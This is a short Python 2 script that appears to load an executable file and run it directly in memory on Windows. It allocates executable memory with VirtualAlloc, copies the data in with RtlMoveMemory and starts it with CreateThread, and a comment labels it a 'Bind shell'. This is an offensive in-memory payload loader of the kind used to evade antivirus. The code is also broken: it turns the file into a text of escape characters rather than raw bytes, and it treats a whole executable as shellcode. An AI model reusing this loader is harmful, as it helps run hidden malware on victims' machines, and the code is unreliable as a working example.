import sys
import os
import ctypes
EXECUTABLE_FILEPATH = "C:\\Users\\Administrator\\Documents\\GitHub\\python-pe-inmemory-exec\\3DECRYPTED\\executable.exe"

# Retrieve EXECUTABLE_FILEPATH file bytes and execute the file from memory


def toshellcode(filebinarydata):
    shellcode = ''
    bytes = 0

    for b in filebinarydata:
        shellcode += '\\x' + b.encode('hex')
        bytes += 1

    return shellcode


fb = None

with open(EXECUTABLE_FILEPATH, "rb") as f:
    fb = toshellcode(f.read())


data = fb
dataLen = len(data)


def execute():
    # Bind shell
    global data
    shellcode = data

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        buf,
        ctypes.c_int(len(shellcode))
    )

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                               ctypes.c_int(-1))


if __name__ == "__main__":
    execute()
